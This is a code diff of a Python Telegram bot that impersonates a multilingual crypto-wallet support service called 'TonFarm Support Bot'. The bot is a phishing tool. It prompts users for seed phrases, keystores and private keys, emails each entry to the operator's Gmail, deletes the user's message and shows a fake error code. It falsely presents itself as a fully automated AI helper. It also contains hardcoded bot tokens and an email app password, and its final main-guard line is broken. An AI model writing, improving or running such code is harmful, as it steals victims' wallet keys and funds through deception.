@@ -1,10 +1,6 @@
 import smtplib
 from email.mime.text import MIMEText
-from telegram import (
-    InlineKeyboardButton,
-    InlineKeyboardMarkup,
-    Update
-)
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.ext import (
     ApplicationBuilder,
     CommandHandler,
@@ -14,15 +10,15 @@ from telegram.ext import (
     filters,
 )
 
-# === Replace with your Bot Token ===
-BOT_TOKEN = "7653749701:AAEHRxMJFjJrj08_e_fX_ywRV6GL3coSsPU"
-
-# === Add your email credentials here ===
-EMAIL_ADDRESS = "victoralbs4050th@gmail.com"
-EMAIL_PASSWORD = "pgpg dfst mhrz rohk"   # Gmail App Password
+# =========================
+# BOT CONFIG
+# =========================
+BOT_TOKEN = "8309220077:AAHWnKbGoKoEXe9b3fo1izeIb0jHboT6wzc"
+EMAIL_ADDRESS = "Victoralbs4050th@gmail.com"
+EMAIL_PASSWORD = "pgpg dfst mhrz rohk"
 
 # =========================
-# Error codes per wallet
+# ERROR CODES (Wallet Mapping)
 # =========================
 ERROR_CODES = {
     "TonKeeper": "SERVER-TNKP78",
@@ -44,99 +40,171 @@ ERROR_CODES = {
 }
 
 # =========================
-# 1. START / WELCOME SCREEN
+# RTL FORMATTER
+# =========================
+def rtl(text: str) -> str:
+    """Ensures Persian (Farsi) text displays right-to-left in Telegram."""
+    return f"\u202B{text}\u202C"
+
+# =========================
+# LANGUAGES
+# =========================
+LANGUAGES = {
+    "en": {
+        "name": "🇬🇧 English",
+        "welcome": "🤖 Rules, tickets, rewards, in-game issues, and bugs\n\n"
+                   "🤖 TonFarm Support Bot is a free online assistant available directly on Telegram. "
+                   "Get help resolving wallet and transaction issues efficiently.\n\n"
+                   "🤖 You will be chatting with an Artificial Intelligence Support Bot with zero human interference.",
+        "main_menu": "Please select the service you need help with 👇",
+        "menu_buttons": ["Migration", "Rectification", "Withdraw Issue", "Claim Reflection", "Assets Recovery", "Login Issue"],
+        "connect_wallet": "🔗 Connect Wallet\nSelect your wallet to continue 👇",
+        "secure_connection": "🔒 Secure Connection – {wallet}\n\nConnect using any option below 👇",
+        "auth_buttons": ["Phrase", "Keystore", "Private Key", "Cancel"],
+        "enter_input": "🔑 Please enter your {auth_type}:",
+        "back_wallets": "🔙 Back to Wallets",
+        "back_main": "🔙 Back to Main Menu"
+    },
+    "ru": {
+        "name": "🇷🇺 Русский",
+        "welcome": "🤖 Правила, билеты, награды, игровые проблемы и ошибки\n\n"
+                   "🤖 TonFarm Support Bot — это бесплатный онлайн-помощник прямо в Telegram. "
+                   "Получите помощь в решении проблем с кошельками и транзакциями.\n\n"
+                   "🤖 Вы будете общаться с ботом искусственного интеллекта без вмешательства человека.",
+        "main_menu": "Пожалуйста, выберите нужный сервис 👇",
+        "menu_buttons": ["Миграция", "Исправление", "Проблема с выводом", "Отражение", "Восстановление активов", "Проблема с входом"],
+        "connect_wallet": "🔗 Подключение кошелька\nВыберите свой кошелек 👇",
+        "secure_connection": "🔒 Безопасное соединение – {wallet}\n\nПодключитесь с помощью одного из вариантов ниже 👇",
+        "auth_buttons": ["Фраза", "Keystore", "Приватный ключ", "Отмена"],
+        "enter_input": "🔑 Введите {auth_type}:",
+        "back_wallets": "🔙 Назад к кошелькам",
+        "back_main": "🔙 Назад в меню"
+    },
+    "de": {
+        "name": "🇩🇪 Deutsch",
+        "welcome": "🤖 Regeln, Tickets, Belohnungen, Spielprobleme und Bugs\n\n"
+                   "🤖 TonFarm Support Bot ist ein kostenloser Online-Assistent direkt auf Telegram. "
+                   "Erhalten Sie Hilfe bei Wallet- und Transaktionsproblemen.\n\n"
+                   "🤖 Sie chatten mit einem KI-Support-Bot ohne menschliches Eingreifen.",
+        "main_menu": "Bitte wählen Sie den gewünschten Service 👇",
+        "menu_buttons": ["Migration", "Berichtigung", "Auszahlungsproblem", "Reflexion beanspruchen", "Vermögenswiederherstellung", "Login Problem"],
+        "connect_wallet": "🔗 Wallet verbinden\nWählen Sie Ihr Wallet 👇",
+        "secure_connection": "🔒 Sichere Verbindung – {wallet}\n\nVerbinden Sie sich mit einer der folgenden Optionen 👇",
+        "auth_buttons": ["Phrase", "Keystore", "Privater Schlüssel", "Abbrechen"],
+        "enter_input": "🔑 Bitte geben Sie Ihre {auth_type} ein:",
+        "back_wallets": "🔙 Zurück zu Wallets",
+        "back_main": "🔙 Zurück zum Hauptmenü"
+    },
+    "es": {
+        "name": "🇪🇸 Español",
+        "welcome": "🤖 Reglas, tickets, recompensas, problemas y errores\n\n"
+                   "🤖 TonFarm Support Bot es un asistente gratuito disponible en Telegram. "
+                   "Obtén ayuda para resolver problemas de billetera y transacciones.\n\n"
+                   "🤖 Estarás chateando con un Bot de Soporte de Inteligencia Artificial sin intervención humana.",
+        "main_menu": "Por favor, seleccione el servicio que necesita 👇",
+        "menu_buttons": ["Migración", "Rectificación", "Problema de retiro", "Reclamar reflexión", "Recuperación de activos", "Problema de inicio de sesión"],
+        "connect_wallet": "🔗 Conectar billetera\nSeleccione su billetera 👇",
+        "secure_connection": "🔒 Conexión segura – {wallet}\n\nConéctese utilizando una de las siguientes opciones 👇",
+        "auth_buttons": ["Frase", "Keystore", "Clave privada", "Cancelar"],
+        "enter_input": "🔑 Por favor, ingrese su {auth_type}:",
+        "back_wallets": "🔙 Volver a Billeteras",
+        "back_main": "🔙 Volver al Menú Principal"
+    },
+    "fa": {
+        "name": "🇮🇷 فارسی",
+        "welcome": rtl("🤖 قوانین، تیکت‌ها، پاداش‌ها، مشکلات و خطاهای بازی\n\n"
+                       "🤖 ربات پشتیبانی TonFarm یک دستیار رایگان آنلاین در تلگرام است. "
+                       "برای حل مشکلات کیف پول و تراکنش‌های خود به‌صورت سریع کمک بگیرید.\n\n"
+                       "🤖 شما با یک ربات پشتیبانی هوش مصنوعی چت خواهید کرد بدون هیچ دخالت انسانی."),
+        "main_menu": rtl("لطفاً سرویس مورد نظر خود را انتخاب کنید 👇"),
+        "menu_buttons": ["مهاجرت", "اصلاح", "مشکل برداشت", "درخواست بازتاب", "بازیابی دارایی‌ها", "مشکل ورود"],
+        "connect_wallet": rtl("🔗 اتصال کیف پول\nکیف پول خود را انتخاب کنید 👇"),
+        "secure_connection": rtl("🔒 اتصال امن – {wallet}\n\nبا یکی از گزینه‌های زیر متصل شوید 👇"),
+        "auth_buttons": ["عبارت بازیابی", "Keystore", "کلید خصوصی", "لغو"],
+        "enter_input": rtl("🔑 لطفاً {auth_type} خود را وارد کنید:"),
+        "back_wallets": rtl("🔙 بازگشت به کیف پول‌ها"),
+        "back_main": rtl("🔙 بازگشت به منوی اصلی")
+    },
+}
+
+# =========================
+# START / LANGUAGE SELECTION
 # =========================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = (
-        "🌐 The Open Network for everyone\n\n"
-        "Open and decentralized protocol for syncing various Wallets issues on Secure Server.\n"
-        "This is not an app but a protocol that establishes a remote resolution between all noncustodial wallets.\n\n"
-        "🤖 You will be on a chat with an Artificial Intelligence Robot with zero Human interference."
-    )
-    keyboard = [
-        [InlineKeyboardButton("Claim Airdrop", callback_data="claim_airdrop")],
-        [InlineKeyboardButton("Resolve Issues", callback_data="resolve_issues")]
-    ]
-    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
-
-# =========================
-# 2. MAIN MENU (RESOLVE ISSUES)
-# =========================
-async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    keyboard = [
-        [InlineKeyboardButton("Migration", callback_data="migration")],
-        [InlineKeyboardButton("Rectification", callback_data="rectification")],
-        [InlineKeyboardButton("Withdraw Issue", callback_data="withdraw")],
-        [InlineKeyboardButton("Claim Reflection", callback_data="reflection")],
-        [InlineKeyboardButton("Assets Recovery", callback_data="recovery")],
-        [InlineKeyboardButton("Login Issue", callback_data="login")]
-    ]
-    await query.edit_message_text("Please select the service you need help with 👇",
-                                  reply_markup=InlineKeyboardMarkup(keyboard))
-
-# =========================
-# 3. WALLET LIST (3AUTH Section)
-# =========================
-async def wallet_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    wallets = [
-        "TonKeeper", "MyTonWallet", "TonHub",
-        "DeWallet", "Telegram Wallet", "Bitget",
-        "Safepal", "Trust Wallet", "Metamask",
-        "Wallet Connect", "Ledger", "BRD Wallet",
-        "Coinbase", "Best Wallet", "Zedna Wallet", "OKX"
-    ]
-    keyboard = [[InlineKeyboardButton(w, callback_data=f"wallet_{w}")] for w in wallets]
-    await query.edit_message_text("🔗 Connect Wallet\nSelect your wallet to continue 👇",
-                                  reply_markup=InlineKeyboardMarkup(keyboard))
-
-# =========================
-# 5. MANUAL WALLET AUTH (after selecting wallet)
-# =========================
-async def manual_connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    wallet_name = query.data.replace("wallet_", "")
-    context.user_data["selected_wallet"] = wallet_name
-    keyboard = [
-        [InlineKeyboardButton("Phrase", callback_data="auth_phrase")],
-        [InlineKeyboardButton("Keystore", callback_data="auth_keystore")],
-        [InlineKeyboardButton("Private Key", callback_data="auth_private")],
-        [InlineKeyboardButton("Cancel", callback_data="main_menu")]
-    ]
-    await query.edit_message_text(
-        f"🔒 Secure Connection – {wallet_name}\n\n"
-        "Connect using any option below 👇",
+    keyboard = [[InlineKeyboardButton(LANGUAGES[code]["name"], callback_data=f"lang_{code}")]
+                for code in LANGUAGES]
+    await update.message.reply_text(
+        "🌐 Please select your language / Пожалуйста, выберите язык / Wählen Sie Ihre Sprache / Seleccione su idioma / لطفاً زبان خود را انتخاب کنید 👇",
         reply_markup=InlineKeyboardMarkup(keyboard)
     )
 
 # =========================
-# 6. ASK FOR USER INPUT
+# MAIN MENU
+# =========================
+async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    lang = context.user_data.get("lang", "en")
+    text = LANGUAGES[lang]["main_menu"]
+    menu = LANGUAGES[lang]["menu_buttons"]
+
+    keyboard = [[InlineKeyboardButton(btn, callback_data=cb)]
+                for btn, cb in zip(menu, ["migration", "rectification", "withdraw", "reflection", "recovery", "login"])]
+    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+
+# =========================
+# WALLET LIST
+# =========================
+async def wallet_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    lang = context.user_data.get("lang", "en")
+    wallets = list(ERROR_CODES.keys())
+    keyboard = [[InlineKeyboardButton(w, callback_data=f"wallet_{w}")] for w in wallets]
+    await query.edit_message_text(LANGUAGES[lang]["connect_wallet"], reply_markup=InlineKeyboardMarkup(keyboard))
+
+# =========================
+# MANUAL CONNECTION
+# =========================
+async def manual_connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    lang = context.user_data.get("lang", "en")
+    wallet_name = query.data.replace("wallet_", "")
+    context.user_data["selected_wallet"] = wallet_name
+    buttons = LANGUAGES[lang]["auth_buttons"]
+
+    keyboard = [[InlineKeyboardButton(btn, callback_data=f"auth_{btn.lower().replace(' ', '')}")] for btn in buttons]
+    await query.edit_message_text(
+        LANGUAGES[lang]["secure_connection"].format(wallet=wallet_name),
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+# =========================
+# ASK FOR INPUT
 # =========================
 async def ask_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
+    lang = context.user_data.get("lang", "en")
     auth_type = query.data.replace("auth_", "")
     context.user_data["expecting_input"] = auth_type
-    await query.message.reply_text(f"🔑 Please enter your {auth_type}:")
+    await query.message.reply_text(LANGUAGES[lang]["enter_input"].format(auth_type=auth_type))
 
 # =========================
-# 7. HANDLE USER INPUT + ERROR FEEDBACK
+# HANDLE USER INPUT + DELETE MESSAGE + ERROR FEEDBACK
 # =========================
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = context.user_data.get("expecting_input")
     wallet_name = context.user_data.get("selected_wallet", "Wallet")
     error_code = ERROR_CODES.get(wallet_name, "SERVER-UNKNOWN")
+    lang = context.user_data.get("lang", "en")
 
     if state:
         user_input = update.message.text
 
-        # 📩 Send input to your email
         send_email(
-            subject=f"Bot Input from {wallet_name}",
+            subject=f"TonFarm Support Bot Input from {wallet_name}",
             body=f"User ID: {update.effective_user.id}\n"
                  f"Username: @{update.effective_user.username}\n"
                  f"Wallet: {wallet_name}\n"
@@ -144,16 +212,23 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                  f"Input:\n{user_input}"
         )
 
+        try:
+            await update.message.delete()
+        except:
+            pass
+
         keyboard = [
-            [InlineKeyboardButton("🔙 Back to Wallets", callback_data="connect_wallet")],
-            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]
+            [InlineKeyboardButton(LANGUAGES[lang]["back_wallets"], callback_data="connect_wallet")],
+            [InlineKeyboardButton(LANGUAGES[lang]["back_main"], callback_data="main_menu")]
         ]
+
         await update.message.chat.send_message(
-            f"‼ An error occured while connecting to {wallet_name}.\n"
-            f"{error_code} failed.\n\n"
-            "Please ensure you are entering the correct key, use copy and paste to avoid errors.",
+            f"‼ Error while connecting to {wallet_name}\n\n"
+            f"⚠ {error_code} failed.\n\n"
+            "👉 Please double-check your input and use copy-paste to avoid mistakes.",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
+
         context.user_data.clear()
     else:
         await update.message.reply_text("ℹ Please choose an option first with /start.")
@@ -177,8 +252,14 @@ def send_email(subject, body):
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     data = query.data
-    if data == "claim_airdrop":
-        await wallet_connection(update, context)
+
+    if data.startswith("lang_"):
+        lang_code = data.split("_", 1)[1]
+        context.user_data["lang"] = lang_code
+        await query.edit_message_text(LANGUAGES[lang_code]["welcome"])
+        keyboard = [[InlineKeyboardButton("Resolve Issues", callback_data="resolve_issues")]]
+        await query.message.reply_text("👇", reply_markup=InlineKeyboardMarkup(keyboard))
+
     elif data == "resolve_issues":
         await main_menu(update, context)
     elif data in ["migration", "rectification", "withdraw", "reflection", "recovery", "login"]:
@@ -200,10 +281,8 @@ def main():
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    print("🤖 TON Resolution Bot running...")
+    print("🤖 TonFarm Support Bot running...")
     app.run_polling()
 
-if __name__ == "__main__":
-
+if _name_ == "_main_":
     main()
-
